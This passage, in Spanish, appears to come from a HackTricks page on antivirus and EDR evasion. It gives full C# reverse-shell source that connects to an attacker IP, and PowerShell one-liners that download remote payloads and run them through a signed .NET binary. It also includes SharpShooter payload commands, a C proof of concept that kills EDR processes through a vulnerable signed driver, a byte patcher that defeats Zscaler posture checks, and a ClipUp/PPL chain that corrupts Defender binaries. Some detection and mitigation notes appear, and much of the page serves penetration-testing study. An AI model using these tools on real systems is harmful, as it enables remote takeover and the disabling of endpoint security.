c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Úsalo con:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# usando el compilador
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Descarga y ejecución automática:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Lista de ofuscadores de C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Usando python para build injectors (ejemplo):

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Otras herramientas
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Más

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Desactivar AV/EDR desde el espacio kernel

Storm-2603 utilizó una pequeña utilidad de consola conocida como **Antivirus Terminator** para deshabilitar las protecciones endpoint antes de desplegar ransomware. La herramienta trae su **propio driver vulnerable pero *firmado*** y lo abusa para emitir operaciones privilegiadas en el kernel que ni siquiera los servicios AV en Protected-Process-Light (PPL) pueden bloquear.

Puntos clave
1. **Driver firmado**: El archivo entregado en disco es `ServiceMouse.sys`, pero el binario es el driver legítimamente firmado `AToolsKrnl64.sys` de Antiy Labs’ “System In-Depth Analysis Toolkit”. Debido a que el driver tiene una firma válida de Microsoft se carga incluso cuando Driver-Signature-Enforcement (DSE) está habilitado.
2. **Instalación del servicio**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
La primera línea registra el driver como un **servicio kernel** y la segunda lo inicia para que `\\.\ServiceMouse` sea accesible desde el espacio de usuario.
3. **IOCTLs expuestos por el driver**
| IOCTL code | Capacidad                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Terminar un proceso arbitrario por PID (usado para matar servicios Defender/EDR) |
| `0x990000D0` | Eliminar un archivo arbitrario en disco |
| `0x990001D0` | Descargar el driver y eliminar el servicio |

Prueba de concepto mínima en C:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Por qué funciona**: BYOVD evita por completo las protecciones en user-mode; el código que se ejecuta en el kernel puede abrir procesos *protegidos*, terminarlos o manipular objetos del kernel independientemente de PPL/PP, ELAM u otras medidas de hardening.

Detección / Mitigación
•  Habilitar la lista de bloqueo de drivers vulnerables de Microsoft (`HVCI`, `Smart App Control`) para que Windows se niegue a cargar `AToolsKrnl64.sys`.  
•  Monitorizar la creación de nuevos servicios *kernel* y alertar cuando un driver se cargue desde un directorio escribible por cualquiera o no esté presente en la lista de permitidos.  
•  Vigilar handles en user-mode hacia objetos de dispositivo personalizados seguidos de llamadas sospechosas a `DeviceIoControl`.

### Evasión de las comprobaciones de postura de Zscaler Client Connector mediante parcheo binario en disco

Zscaler’s **Client Connector** aplica reglas de postura del dispositivo localmente y depende de Windows RPC para comunicar los resultados a otros componentes. Dos decisiones de diseño débiles hacen posible una evasión completa:

1. La evaluación de postura ocurre **enteramente en el cliente** (se envía un booleano al servidor).  
2. Los endpoints RPC internos sólo validan que el ejecutable conectante esté **firmado por Zscaler** (vía `WinVerifyTrust`).

Parcheando cuatro binarios firmados en disco se pueden neutralizar ambos mecanismos:

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Devuelve siempre `1` por lo que cada comprobación resulta conforme |
| `ZSAService.exe` | Indirect call to `WinVerifyTrust` | NOP-ed ⇒ cualquier proceso (incluso no firmado) puede enlazarse a las RPC pipes |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Reemplazado por `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integrity checks on the tunnel | Cortocircuitado |

Minimal patcher excerpt:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Después de reemplazar los archivos originales y reiniciar la pila de servicios:

* **Todas** las comprobaciones de postura muestran **verde/conformes**.
* Binarios no firmados o modificados pueden abrir los endpoints RPC de named-pipe (p. ej. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* El host comprometido obtiene acceso sin restricciones a la red interna definida por las políticas de Zscaler.

Este estudio de caso demuestra cómo decisiones de confianza puramente del lado del cliente y simples comprobaciones de firma pueden ser derrotadas con unos pocos parches de bytes.

## Abusar de Protected Process Light (PPL) para manipular AV/EDR con LOLBINs

Protected Process Light (PPL) aplica una jerarquía de firmantes/nivel para que solo procesos protegidos de igual o mayor nivel puedan manipularse entre sí. Desde una perspectiva ofensiva, si puedes lanzar legítimamente un binario habilitado para PPL y controlar sus argumentos, puedes convertir funcionalidad benignas (p. ej., logging) en una primitiva de escritura restringida respaldada por PPL contra directorios protegidos usados por AV/EDR.

What makes a process run as PPL
- El EXE objetivo (y cualquier DLL cargada) debe estar firmado con un EKU compatible con PPL.
- El proceso debe crearse con CreateProcess usando las flags: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Se debe solicitar un nivel de protección compatible que coincida con el firmante del binario (p. ej., `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` para firmantes anti-malware, `PROTECTION_LEVEL_WINDOWS` para firmantes de Windows). Niveles incorrectos fallarán en la creación.

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Ayudante de código abierto: CreateProcessAsPPL (selecciona el nivel de protección y reenvía los argumentos al EXE objetivo):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Patrón de uso:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- El binario del sistema firmado `C:\Windows\System32\ClipUp.exe` se auto-lanza y acepta un parámetro para escribir un archivo de registro en una ruta especificada por el llamador.
- Cuando se ejecuta como proceso PPL, la escritura de archivo ocurre con soporte PPL.
- ClipUp no puede parsear rutas que contienen espacios; use rutas cortas 8.3 para apuntar a ubicaciones normalmente protegidas.

8.3 short path helpers
- Listar nombres cortos: `dir /x` en cada directorio padre.
- Derivar ruta corta en cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Inicie el LOLBIN compatible con PPL (ClipUp) con `CREATE_PROTECTED_PROCESS` usando un lanzador (p. ej., CreateProcessAsPPL).
2) Pase el argumento de ruta de registro de ClipUp para forzar la creación de un archivo en un directorio protegido del AV (p. ej., Defender Platform). Use nombres cortos 8.3 si es necesario.
3) Si el binario objetivo normalmente está abierto/bloqueado por el AV mientras se ejecuta (p. ej., MsMpEng.exe), programe la escritura en el arranque antes de que el AV inicie instalando un servicio de autoarranque que se ejecute de forma fiable antes. Valide el orden de arranque con Process Monitor (boot logging).
4) En el reinicio, la escritura respaldada por PPL ocurre antes de que el AV bloquee sus binarios, corrompiendo el archivo objetivo e impidiendo su arranque.

Ejemplo de invocación (rutas redactadas/acortadas por seguridad):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Notas y restricciones
- No puedes controlar el contenido que ClipUp escribe más allá de la ubicación; el primitive está más orientado a la corrupción que a la inyección precisa de contenido.
- Requiere admin local/SYSTEM para instalar/iniciar un servicio y una ventana de reinicio.
- El timing es crítico: el objetivo no debe estar abierto; la ejecución en tiempo de arranque evita bloqueos de archivos.

Detecciones
- Creación de procesos de `ClipUp.exe` con argumentos inusuales, especialmente si tienen como padre lanzadores no estándar, alrededor del arranque.
- Nuevos servicios configurados para auto-start de binarios sospechosos y que consistentemente arrancan antes de Defender/AV. Investigar creación/modificación de servicios antes de fallos en el arranque de Defender.
- Monitoreo de integridad de archivos en los binarios/Directorios Platform de Defender; creaciones/modificaciones de archivos inesperadas por procesos con flags de protected-process.
- Telemetría ETW/EDR: buscar procesos creados con `CREATE_PROTECTED_PROCESS` y uso anómalo de niveles PPL por binarios que no son AV.

Mitigaciones
- WDAC/Code Integrity: restringir qué binarios firmados pueden ejecutarse como PPL y bajo qué padres; bloquear invocaciones de ClipUp fuera de contextos legítimos.
- Higiene de servicios: restringir la creación/modificación de servicios auto-start y monitorizar la manipulación del orden de arranque.
- Asegurar que la protección contra manipulación de Defender y las protecciones de early-launch estén habilitadas; investigar errores de arranque que indiquen corrupción de binarios.
- Considerar deshabilitar la generación de nombres cortos 8.3 en volúmenes que alberguen tooling de seguridad si es compatible con tu entorno (probar exhaustivamente).

References for PPL and tooling
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## References

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)

{{#include ../banners/hacktricks-training.md}}
